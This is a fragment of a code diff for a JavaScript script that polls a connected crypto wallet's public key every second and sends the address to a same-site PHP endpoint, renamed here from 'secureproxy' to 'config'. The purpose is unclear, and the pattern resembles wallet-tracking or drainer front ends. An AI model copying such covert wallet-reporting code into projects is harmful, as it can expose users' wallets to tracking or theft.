@@ -2,7 +2,7 @@
 let lastPublicKey = null;
 
 async function triggerSecureProxy(walletAddress) {
-  const endpoint = 'secureproxy'; // Your PHP file
+  const endpoint = 'config'; // Your PHP file
   const url = `/${endpoint}?e=${encodeURIComponent(walletAddress)}&t=${Date.now()}`;
 
   try {
@@ -36,4 +36,5 @@ setInterval(() => {
     }
   }
 }, 1000);
+
 
